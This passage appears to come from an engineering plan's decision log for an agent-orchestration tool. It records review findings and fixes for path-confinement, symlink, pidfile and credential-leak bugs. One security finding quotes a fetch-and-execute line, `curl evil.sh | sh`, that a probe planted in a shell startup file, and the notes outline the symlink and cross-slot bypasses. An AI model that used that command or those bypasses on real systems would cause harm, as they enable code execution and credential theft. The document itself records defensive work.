- **2026-07-26** (Lane A merge session, decision by Zach): **D119 resolved downward** - no chat surface plus the email surface the pack actually subscribes to, rather than adding a Slack service. Keeps `dogfood-content-review` credential-free as the release-smoke pack, at the cost of that pack never exercising the Slack path in smoke runs. Tests exist for both directions, so reversing this is a marker change, not a rewrite. *(Recorded as `chat: cli` at the time; corrected 2026-07-27 to an ABSENT key, which is what `_apply_chat` writes for the cli decision.)*

- **2026-07-27** (Lane A review-gate remediation): the house gate ran on the merged head and returned **NEEDS FIXES @ 50640e6** - 1 BLOCKING and 8 MAJOR, none of which the round-2 verdict had covered. All fixed here, each failing-test-first:
  **BLOCKING** - `_confine_pack_root` compared paths case-sensitively while `Path.resolve()` does not fold case, so on a case-insensitive filesystem `location: .../RUN` walked straight back into the three-request credential leak D081 closed. `_within_home` did not catch it because an ALLOW check fails closed on a case mismatch; this is a DENY check and failed open. Containment now compares by identity where both sides exist and by an NFC+casefold fold otherwise, unconditionally - a deny gate is the wrong place to ask which kind of filesystem this is.
  **MAJOR** - pack `version:` bumps were missing entirely (eng-team 1.5.1→1.5.2, dogfood 1.2.1→1.2.2, registry + the two tests that hard-pinned the old strings, now a pack-vs-registry coherence check instead of a literal); `fsutil.atomic_write_text` replaced a symlinked target instead of writing through it, orphaning the real file; the fail-closed rule inverted inside `stop_pidfile`'s grace loop, so one failed `ps` deleted a live daemon's pidfile and reported `stopped`; `cancel_agent` still signalled a registry pid with no identity check; `script_cache_checks._pin` kept a FIXED temp name that D004's worker thread made racy (8 concurrent pins: 7 died consuming each other's temp); both restart paths discarded the `StopResult` this lane taught to fail; and four bare durable writes (`authoring.py` x2, `cli.py` x2, `webui/server.py`) sat behind two holes in the convergence guard - an aliased `import yaml as _yaml`, and a dump reached through helper returns. The guard now resolves serializer aliases and follows intra-module returns to a fixed point, with positive controls for both, and `setup/webui/server.py` came off the deny list.
  Also closed: a vacuous `caplog.at_level(WARNING)` assertion on an INFO log line (mutation-tested), two vacuous `poll() is None` pid-identity assertions (`poll()` reads None straight after a SIGTERM that lands - the correct form is `pytest.raises(TimeoutExpired)` on `wait()`, which the same PR already used in `test_cli.py`), dead `os`/`signal` imports, `positive_int`'s no-longer-true "the ONE parser" docstring, `StopResult`'s "exactly one flag is set" (its no-pidfile path sets none), and the `chat: cli`/absent-key split - the pack now ships NO `chat:` key, matching the policy `_apply_chat` codifies, with the end state asserted rather than early-exited past.
  **Withdrawn on evidence:** the gate flagged the claude-gated `TestScriptCacheRealAgent` as possibly broken by the fixture's 60s `GEN_HANDOFF_GRACE`. It is not - it fails in 0.1s on `Bobi root not bound`, identically on `main`, so it is a pre-existing environmental gap in how that test is invoked, unrelated to this lane. Left untouched and unfixed; worth its own ticket.

- **2026-07-27** (second gate run, `NEEDS FIXES @ 1360bfd`): **the fix round closed three findings, regressed two, and left four partly open** - recorded here because the plan must not read as if the remediation landed clean. CLOSED: B1 (20 alias shapes probed), M1, M8. REGRESSED by the fix itself: **M3** (the `unreadable` early-return made `escalate`'s SIGKILL unreachable, so a wedged unattended daemon was never force-killed) and **M4** (the identity gate matched neither shape a RESUMED workflow wears, since `resume_workflow` re-stamps the entry with the `workflows resume` CLI's pid - cancel sent no signal and still reported success). Both fixed in this round, with the stop loop now asking `_is_zombie` directly instead of inferring an exit from silence.
  Also fixed this round: `copy_into` carried the SAME case-sensitive deny shape B1 fixed and was missed (`fsutil.same_location` is now the one definition, hoisted out of the webui module); `webapp/runtime.py` is the LIVE restart path and gates on `settled` (the `service.restart_team` converted last round has zero callers - the plan's own Q031 records that and it was not read); `_open_temp`'s docstring still promised symlink refusal that `_write_target` had just undone; and five test-quality gaps, including one where the M3 test passed a mutant that dropped the very flag it existed to pin.
  **STILL OPEN and NOT fixed here** - these need their own change and their own review, not another patch on this branch:
  - **NEW BLOCKING (cross-slot):** `_confine_pack_root` is parameterised on THIS session's run root, so `location: <other slot>/run` reaches a neighbouring team's `run/package/agent.yaml` and leaks its `${VAR}`s through that slot's `/api/credential/value`. Probe-confirmed. Multi-slot is the normal topology. This is a containment-MODEL question (may a setup session reach any run root at all?), not a spelling fix.
  - **M2 traded a data-loss bug for a security hole:** making `fsutil` follow symlinks means `_pin` writes THROUGH a link planted at `run/state/scripts/<monitor>.sc.sh` - a directory `runtime_guard` does not lock and agent tools can write - and chmods the victim `+x`. Probe wrote `curl evil.sh | sh` into `~/.zshrc`. `_verify_integrity` cannot see it because it re-reads through the same link. Recommendation: REVERT the follow-symlinks change and refuse a symlinked target loudly instead.
  - M5's content-vs-recorded-sha ordering (unique temp names fixed the collision, not the ordering) plus a new `FileNotFoundError` race from chmod-after-swap; M7's guard still misses eight shapes including `yaml.safe_dump`, and `/api/file` still truncate-writes team source; `is_subagent_argv` false-positives on any argv mentioning both markers.

## Notes

- **Deferred to a successor structural-refactor plan** (explicitly out of scope here; do not partially attempt): Q001/Q040 (cli.py command-tree rewiring), Q002 (subagent.py event-subscription extraction, ~370 lines + 10 test monkeypatch sites), Q003 (`_run_workflow_async` decomposition), Q103 (run_phase_blocking/spawn_adhoc skeleton unification), Q106 (events/server.py split), Q004 (local.ts route table), Q036 (core.ts god-file split), Q005/Q111/Q129 (shared integration-test harness). The appendix entries carry the verifier traces for when that plan is written.
- **Provenance**: two Workflow review passes 2026-07-19/22 (146 + 135 agents); findings JSONs and the full HTML report live with the review session; the committed appendix is the durable extract.
- **Operational**: until D017 lands, issue pickup needs a Slack directive (the auto_dispatch rule never matches). Lane A (Phase 1) is the trust-restoring lane — the orchestrator session supervises its build actively rather than trusting terminal signals that lane exists to fix.
- Line numbers in checklist items are from the review tree (`58aba2c`); builders locate by symbol name when lines have drifted.
